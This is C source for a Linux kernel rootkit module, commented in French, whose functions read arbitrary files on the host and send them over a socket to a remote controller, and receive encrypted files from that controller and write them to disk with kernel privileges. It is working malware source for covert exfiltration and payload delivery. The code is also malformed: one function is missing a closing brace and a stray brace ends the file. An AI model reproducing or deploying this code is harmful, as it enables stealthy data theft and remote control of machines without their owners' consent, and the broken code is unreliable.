#include "rootkit.h"

// Fonction pour vérifier si un fichier existe
int file_exists(const char *filepath) {
    struct file *f;
    char *full_path;

    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!full_path) {
        return 0;
    }

    if (filepath[0] != '/') {
        snprintf(full_path, PATH_MAX, "%s/%s", current_dir, filepath);
    } else {
        strncpy(full_path, filepath, PATH_MAX);
        full_path[PATH_MAX-1] = '\0';
    }

    f = filp_open(full_path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        kfree(full_path);
        return 0;
    
    filp_close(f, NULL);
    kfree(full_path);
    return 1;
}

// Fonction pour envoyer un fichier (download côté rootkit)
void send_file(const char *filepath) {
    struct file *f;
    char *buf;
    loff_t pos = 0;
    ssize_t len;
    char size_msg[64];
    char *full_path;
    struct msghdr msg = {0};
    struct kvec vec;

    // Allouer dynamiquement pour éviter le warning
    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!full_path) {
        send_response("[ERROR] Memory allocation failed\n");
        send_response(END_OUTPUT);
        return;
    }

    // Vérifier d'abord si le fichier existe
    if (!file_exists(filepath)) {
        send_response("[ERROR] File not found\n");
        send_response(END_OUTPUT);
        kfree(full_path);
        return;
    }

    // Résoudre le chemin relatif
    if (filepath[0] != '/') {
        snprintf(full_path, PATH_MAX, "%s/%s", current_dir, filepath);
    } else {
        strncpy(full_path, filepath, PATH_MAX);
        full_path[PATH_MAX-1] = '\0';
    }

    f = filp_open(full_path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        send_response("[ERROR] File not found or cannot be opened\n");
        send_response(END_OUTPUT);
        kfree(full_path);
        return;
    }

    // Envoyer le marqueur de début EN CLAIR
    vec.iov_base = DOWNLOAD_MARKER;
    vec.iov_len = strlen(DOWNLOAD_MARKER);
    kernel_sendmsg(conn_socket, &msg, &vec, 1, vec.iov_len);
    
    // Envoyer la taille EN CLAIR
    snprintf(size_msg, sizeof(size_msg), "SIZE:%lld\n", i_size_read(file_inode(f)));
    vec.iov_base = size_msg;
    vec.iov_len = strlen(size_msg);
    kernel_sendmsg(conn_socket, &msg, &vec, 1, vec.iov_len);

    buf = kmalloc(FILE_CHUNK_SIZE, GFP_KERNEL);
    if (!buf) {
        send_response("[ERROR] Memory allocation failed\n");
        filp_close(f, NULL);
        send_response(END_OUTPUT);
        kfree(full_path);
        return;
    }

    // Envoyer le fichier EN CLAIR par chunks
    while ((len = kernel_read(f, buf, FILE_CHUNK_SIZE, &pos)) > 0) {
        vec.iov_base = buf;
        vec.iov_len = len;
        kernel_sendmsg(conn_socket, &msg, &vec, 1, len);
    }

    kfree(buf);
    filp_close(f, NULL);
    kfree(full_path);
    
    // Envoyer le marqueur de fin EN CLAIR
    vec.iov_base = FILE_END_MARKER;
    vec.iov_len = strlen(FILE_END_MARKER);
    kernel_sendmsg(conn_socket, &msg, &vec, 1, vec.iov_len);
    
    // Messages de status chiffrés
    send_response("[INFO] File sent successfully\n");
    send_response(END_OUTPUT);
}

// Fonction pour recevoir un fichier (upload côté rootkit)
void receive_file(const char *filepath) {
    struct file *f;
    char *buffer;
    int received;
    loff_t pos = 0;
    char *size_line;
    long long file_size = 0;
    long long received_total = 0;
    char *size_start;
    char *full_path;

    // Allocations dynamiques pour éviter les warnings frame size
    buffer = kmalloc(FILE_CHUNK_SIZE, GFP_KERNEL);
    if (!buffer) {
        send_response("[ERROR] Memory allocation failed\n");
        send_response(END_OUTPUT);
        return;
    }

    size_line = kmalloc(64, GFP_KERNEL);
    if (!size_line) {
        send_response("[ERROR] Memory allocation failed\n");
        send_response(END_OUTPUT);
        kfree(buffer);
        return;
    }

    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!full_path) {
        send_response("[ERROR] Memory allocation failed\n");
        send_response(END_OUTPUT);
        kfree(buffer);
        kfree(size_line);
        return;
    }

    // Résoudre le chemin relatif
    if (filepath[0] != '/') {
        snprintf(full_path, PATH_MAX, "%s/%s", current_dir, filepath);
    } else {
        strncpy(full_path, filepath, PATH_MAX);
        full_path[PATH_MAX-1] = '\0';
    }

    printk(KERN_INFO "[ROOTKIT] Uploading to: %s\n", full_path);

    // Recevoir la taille du fichier (en clair)
	struct msghdr rec_msg = {0};
	struct kvec rec_vec = {
		.iov_base = size_line,
		.iov_len = 63,
	};
	received = kernel_recvmsg(conn_socket, &rec_msg, &rec_vec, 1, 63, 0);
    if (received <= 0) {
        send_response("[ERROR] Failed to receive file size\n");
        send_response(END_OUTPUT);
        goto cleanup;
    }
    size_line[received] = '\0';

    // Parser la taille "SIZE:1234\n"
    size_start = strstr(size_line, "SIZE:");
    if (size_start) {
        file_size = simple_strtoll(size_start + 5, NULL, 10);
        printk(KERN_INFO "[ROOTKIT] Expected file size: %lld bytes\n", file_size);
    } else {
        send_response("[ERROR] Invalid file size format\n");
        send_response(END_OUTPUT);
        goto cleanup;
    }

    // Créer/ouvrir le fichier de destination
    f = filp_open(full_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(f)) {
        send_response("[ERROR] Cannot create destination file\n");
        send_response(END_OUTPUT);
        goto cleanup;
    }

    // Recevoir les données du fichier (chiffrées et les déchiffrer)
    while (received_total < file_size) {
        int to_receive = (file_size - received_total > FILE_CHUNK_SIZE) ? 
                        FILE_CHUNK_SIZE : (file_size - received_total);
        
        // Utiliser receive_encrypted_data pour déchiffrer automatiquement
        received = receive_encrypted_data(buffer, to_receive);
        
        if (received <= 0) {
            printk(KERN_WARNING "[ROOTKIT] Receive failed at %lld/%lld bytes\n", 
                   received_total, file_size);
            break;
        }

        // Écrire les données déchiffrées dans le fichier
        kernel_write(f, buffer, received, &pos);
        received_total += received;
    }

    filp_close(f, NULL);

    if (received_total == file_size) {
        send_response("[INFO] File uploaded successfully\n");
        printk(KERN_INFO "[ROOTKIT] Upload completed: %lld bytes\n", received_total);
    } else {
        send_response("[ERROR] File upload incomplete\n");
        printk(KERN_WARNING "[ROOTKIT] Upload incomplete: %lld/%lld bytes\n", 
               received_total, file_size);
    }
    send_response(END_OUTPUT);

cleanup:
    kfree(buffer);
    kfree(size_line);
    kfree(full_path);
}
}
